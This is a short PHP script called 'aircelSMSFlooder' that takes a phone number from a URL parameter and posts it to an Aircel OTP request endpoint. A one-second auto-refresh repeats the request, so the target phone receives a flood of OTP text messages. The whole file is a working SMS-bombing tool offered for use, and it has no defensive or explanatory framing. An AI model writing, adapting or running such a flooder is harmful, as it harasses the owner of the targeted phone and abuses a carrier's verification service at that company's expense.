<?php
/**
 * Created by PhpStorm.
 * User: rdx
 * Date: 22/9/16
 * Time: 12:59 AM
 */

if(isset($_GET['mobile'])) {
    $mobile = $_GET['mobile'];
    aircelSMSFlooder($mobile);
} else {
    echo "Add ?mobile=9999999999  SMS Sent per refresh rate (1s)";
}


function aircelSMSFlooder($mobile) {
    $url = "http://newsim.aircel.com/GYSHD/raiseOtpRequest";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,
        "contact=".$mobile);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec ($ch);
    curl_close ($ch);
    echo 'Success';
    $url1=$_SERVER['REQUEST_URI'];
    header("Refresh: 1; URL=$url1");
}